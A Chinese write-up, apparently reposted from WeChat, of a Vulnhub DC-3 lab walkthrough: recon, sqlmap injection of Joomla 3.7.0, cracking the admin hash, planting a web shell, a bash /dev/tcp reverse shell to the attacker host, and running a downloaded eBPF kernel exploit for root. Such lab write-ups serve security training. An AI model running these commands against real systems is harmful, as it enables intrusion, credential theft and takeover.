\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/lPzg-6Eb9SF8zSi30814Iw)

说明：Vulnhub 是一个渗透测试实战网站，提供了许多带有漏洞的渗透测试靶机下载。适合初学者学习，实践。此次记录的是 DC-3 靶机，全程只有一个 falg 获取 root 权限，以下内容是自身复现的过程，总结记录下来，如有不足请多多指教。

下载地址：

Download (Mirror): http://www.five86.com/downloads/DC-3.zip

目标机 IP 地址：192.168.5.139  
攻击机 kali IP 地址：192.168.5.135

**前期准备：**

信息收集时发现目标机与攻击机不在同一网段上, 下面就对目标机进行网络配置。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGFd70xKzqXHCjrSRreYiaibGgybuQfJvG8yicoZA7wZs9TjgUicicaTg3dMA/640?wx_fmt=png)

开启靶机摁‘e’速度要快，找到 root ro 将 ro 替换为 rw signie init=/bin/bash 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGCII2xf5tPLfXYOoX3GYtQG1dqEjHz2sKiaTW5nczQKEF65icc03yjcXw/640?wx_fmt=png)

Ctrl+x 进入命令行。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZG6Is3Viay79bTAoKiaI3y1KnqIjvicDbRcvicJfcfHKMLOGRwccBvfufRyg/640?wx_fmt=png)  

查看网卡信息， ip a 网卡名为 ens33。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZG3CI32zmwbORv4OIibWXMe0X0WKEBTcfclw4D1YgWbWtWZACCdL3O2tw/640?wx_fmt=png)

编辑网卡配置文件，/vim/etc/network/interfaces  发现网卡名不配，替换网卡名 ens33。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGH4temGgS310EuyH82u5Dls2JdoPBRrGZNRZaiaJF2A2MGBmWc36SorA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGc7R8xRBLrRExdPr24sAiaq0tiazAQLo7czvPEIjSiaoXSUIoqp6lFs6ibQ/640?wx_fmt=png)

配置完成后，重启网卡 /etc/init.d/networking stop   /etc/init.d/networking start 

已经成功获取 ip。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGu3ZMU1F6bkB8PT3TiaMw2wD3LMsRplMY5oLTib3hW6klN8VCWt42eUSg/640?wx_fmt=png)

**信息收集**

配置好 ip 下面进行信息收集。

arp-scan -l 发现目标 ip。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGVicR6yrwoiaAjLiccBicibyaicmGOMUFiceibBw5svvdibDj0f3SiaHMQ0ibVhnOQ/640?wx_fmt=png)

对目标机扫描端口。  

nmap -sV -p- 192.168.5.139  -A 只开启了 web 服务，该站点是使用 joomla 创建。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZG8PwyDaKKmiciaejPgh18ib4ib1iazemBVvbSFbRoic7ba6NribVrMEniaDMSoA/640?wx_fmt=png)

访问后台页面。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGJO0NibfNt3VwdQCsiaL1ocP79IiafFa2Sf4bLZJ6fZ0fDdZH9k8Hwd91A/640?wx_fmt=png)

对后台路径进行爆破。

python .\\dirsearch.py -u http://192.168.5.139/ -e\*

访问爆破出来的路径。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGwMbPJf1BORzagVKYick3j66gLyKuQTU8kSBOrpribD9aLjOdW5fWuzrg/640?wx_fmt=png)

http://192.168.5.139/README.txt

http://192.168.5.139/htaccess.txt

http://192.168.5.139/administrator/index.php

发现了对 joomla 的介绍，登陆后台登陆页面，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGm5GdwpB1hFV3dWaO772TkseEmGtYNnms9M43QicygXf8P1aiad5mInLQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGoWfj05WNXPyibhJ19Wn74qX9E0Lo6HdgR7PYfcdxRjMjnq0Wl7yjU1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGx69ArBye3Se5icyoL4u9gwDKGPG8RsV0RSJjnM8Gs5PRkknxicPzkqDA/640?wx_fmt=png)

收集 joomla3.7.0 是否存在漏洞，该版本存在 SQL 注入漏洞（具体漏洞复现以及成因会在靶机系列结束后进行研讨分析。）, 也可使用 searchsploit 来查找版本所出现的漏洞。(“searchsploit” 是一个用于 Exploit-DB 的命令行搜索工具，它还允许你随身带一份 Exploit-DB 的副本。) 

searchsploit Jooma 3.7.0  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGtibTRUMCJeib32MaeG3NSkLYGDaIPKK8lfQrUWRcghHhYYmgDfYibNreA/640?wx_fmt=png)

find ./ -name 42033.txt 搜索提示文件。查看文档内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGlUPoWAkGUg1w93kCPRnIKDScfIejfwCCkKEYtFAqaWAhoA93FfhDIQ/640?wx_fmt=png)

**攻击操作**  

根据提示，使用 Sqlmap

```
sqlmap -u "http://192.168.5.139/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list\[fullordering\]
```

将数据库爆了出来。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZG1cDIiajQCcxTZzA6LDzicu8mxsaH3CUOSAjnC5xib63eTiaerMtgF0pcPQ/640?wx_fmt=png)

下一步查看 joomladb 数据库中的所有表。

```
sqlmap -u "http://192.168.5.139/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" -D joomladb --tables
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGyjW7mOEn0Gp4pibtxiae1gzWoPEd0FdPV9LKFCEdn4iaaDAoWsdggFqvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24Tqe7BPFvN23OewTXSR8ZGSyCnY3rr0HSk96F2Zp37h0JN7HpicH6CfeoqhnU38RQpr379t9vrqicw/640?wx_fmt=png)

下一步查看 #\_\_users 表中的字段。

```
sqlmap -u "http://192.168.5.139/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" -D joomladb -T "#\_\_users" --columns
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMFa6Lrt5VIektEVcBibic0CJq9DB1RC8ArOL6B8zvY6Lf24L8wTKZtlmg/640?wx_fmt=png)

查看 name 字段与 password 字段，获取用户与密码。  

admin/$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu

```
sqlmap -u "http://192.168.5.139/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" -D joomladb -T "#\_\_users" -C  "name,password" --dump
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMs8lStEjiaLibiaXG6O0YJXp3HrBJN04CyvhibmGW2VxiaVSlicYDmUboI8jA/640?wx_fmt=png)

将密码存入文件中，使用 john 进行解密。

john 可使用字典破解用户密码的 hash 值。破解密码为 snooy。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMVoCQz6a2nejZ7xWgmAO4g0oriaJFfly1rzmn8kAE9Cg8ozmqGrr3DEw/640?wx_fmt=png)

登陆成功。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMElCFo0BCDGiaicmIwGMzwNFQmPpwK8tG5rdMhgeZM07ByJ2ETnSbabEw/640?wx_fmt=png)

点击模板管理，查看详情，修改文件 modules.php，写入木马。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMSynPe3mYq3TSFyDicx2D9ELogIAX5y8pfNqpgG7zroYbOhJyYiblFbibQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsM9vgkicNDcPBF8iaB1EGMwKcf4Xpz0yxtr1kRc7c6XuvsQvvAxkmibvZMA/640?wx_fmt=png)

写入后访问 http://192.168.5.139/templates/beez3/html/

使用蚁剑链接木马。

http://192.168.5.139/templates/beez3/html/modules.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMXqqZJxacE3GibkJzTtN4ibY43R1gNXxA0HQpKQFccyqr4HLXVcI5E2CQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMhaZJOWU22TmNdzOAm9RDMmj2ibaK2KR0JRNu8RuANLfbbzobLMxryUg/640?wx_fmt=png)

反弹 shell: bash -c 'bash -i >& /dev/tcp/192.168.5.135/7777 0>&1' 

反弹成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMFOh1yVPtca9ZrT85icfl67wjEQQyI8x8WZ7LcpjKnQ0zfw3rXAtjLFA/640?wx_fmt=png)

溜达了一圈未发现可利用的东西。查看一下服务器操作版本。看看可否进行提权。

lsb\_release -a

Ubuntu 16.04

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMOknSdUpmKJhySq2yesqSvSvaZnGS1gvEvy4SdWGajVuYSvrQE93FSw/640?wx_fmt=png)

searchsploit Ubuntu 16.04

发现一项内核漏洞可以提权。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsM0LVG4tXrxXoHEhZUOCWibKse7XSABYicnXXXWFepbO4rqib01wVt13Tbw/640?wx_fmt=png)

find ./ -name   39772.txt 搜索详情文件所在路径。文件提示了该漏洞的利用方式，提供了利用工具的下载地址，下载使用 wget 进行下载，下载后解压。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMwLlTECcJDYibgtxKthcr6TAoiaw4ot5rmCKcvVibOIvCuetjdI1ibUFsSA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMUpPiaDRFp13FHxDaricOZs3MZEK6k1xRVyRgFIYclib8cLPxibYeucvTVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMeSBkoE6eBlgCzhcTVyghD5Nz0kXV2P3ic9WSFicDrfvBBGdichOqCtHJw/640?wx_fmt=png)

```
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMyZ8Gjiatw8q8gsQedic543l7fNV6TwpHagFryb2HLTYyoOPeG0S2tS8w/640?wx_fmt=png)

进行解压  

unzip 39772.zip 

tar -xvf exploit.tar 

cd ebpf\_mapfd\_doubleput\_exploit

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsM4pGecJTJ2lQSP13iaEODc8Kaof4mPOnz93lAjAGRz6cLA2o7A5riayQQ/640?wx_fmt=png)

执行./compile.sh （编译会出现 waring 可以忽视）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMXc9AoMWOxCMRlej3GQwrKDTA3ibQONibZiaBv1h8VU8O4GyQmLXNFLia9Q/640?wx_fmt=png)

执行./doubleput，进行提权，稍等片刻提权成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMU0STBDQlmJRX7HG0XMZMmJIGG9eYotqr62PGadznaCs0W5pDe1VBaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa240qibogBstibG4WSWnEQNrsMiaFCxhdOnhdGRPEYpcYkL6bAMVFwianQ09UzStHb1sqXUP5FqN3hBBwQ/640?wx_fmt=png)